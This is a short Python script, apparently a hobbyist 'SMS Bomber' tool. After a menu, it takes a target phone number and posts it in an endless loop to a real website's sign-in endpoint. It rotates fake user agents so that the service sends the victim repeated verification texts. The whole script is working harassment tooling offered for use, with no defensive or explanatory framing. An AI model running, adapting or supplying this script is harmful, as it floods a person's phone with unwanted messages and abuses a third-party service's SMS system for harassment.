import requests, fake_useragent, time, random
from termcolor import colored
import os

os.system('cls' if os.name == 'nt' else 'clear')
usr = fake_useragent.UserAgent().random
header = {'user_agent': usr}

print(colored('''
┌─┐ ┌┬┐┌─┬┐┌─┬─┐┌─┐
││└┐││││┌┤││┌┤│└┘││
│┌┐└┘│└┘┘│└┘┘│┌┐┌┐│
││└┐││┌┐││┌┐│││││││
││ │││││└┤││└┤│││││
└┘ └─┴┘└─┴┘└─┴┘└┘└┘
           ''', 'red'), 'UKRAINE')
print('''
1. SMS Bomber
2. Help
3. About

0. Exit''')
choose = input('Choose: ')

while True:
    if choose == "1":
        os.system('cls' if os.name == 'nt' else 'clear')
        number = input("Enter the number(Without +): ")

        while True:
            usr = fake_useragent.UserAgent().random
            header = {'user_agent': usr}

            try:
                requests.post('https://my.drom.ru/sign?return=https%3A%2F%2Fwww.drom.ru%2F%3Ftcb%3D1618305538', headers = header, data = {'sign': number})
                print(colored("[+]", 'green'), "Taxi571 sent")
            except:
                print(colored('[-]', "red"), 'Taxi571 not sent')

            time.sleep(5)
    elif choose == '2':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''Help:
        This is help
        ''')
    elif choose == '3':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''About:
    Created by katsume.
    TG: @nlxrd
    Github: github.com/katsume
        ''')
    elif choose == "0":
        exit()
    else:
        exit()
    print('''1. SMS Bomber
2. Help
3. About

0. Exit''')
    choose = input('Choose: ')
